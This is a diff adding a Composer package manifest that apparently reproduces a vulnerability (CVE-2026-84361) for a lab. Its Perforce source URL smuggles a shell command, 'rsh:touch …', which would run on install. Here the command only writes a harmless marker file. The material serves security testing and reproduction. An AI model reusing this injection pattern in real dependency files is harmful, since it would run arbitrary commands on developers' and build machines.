@@ -1,0 +1,26 @@
+{
+  "name": "vulhub/cve-2026-84361",
+  "description": "CVE-2026-84361 reproduction",
+  "minimum-stability": "dev",
+  "prefer-stable": true,
+  "repositories": [
+    {
+      "packagist.org": false
+    },
+    {
+      "type": "package",
+      "package": {
+        "name": "vulhub/perforce-source",
+        "version": "1.0.0",
+        "source": {
+          "type": "perforce",
+          "url": "rsh:touch /tmp/cve-2026-84361-success",
+          "reference": "//depot/main"
+        }
+      }
+    }
+  ],
+  "require": {
+    "vulhub/perforce-source": "1.0.0"
+  }
+}
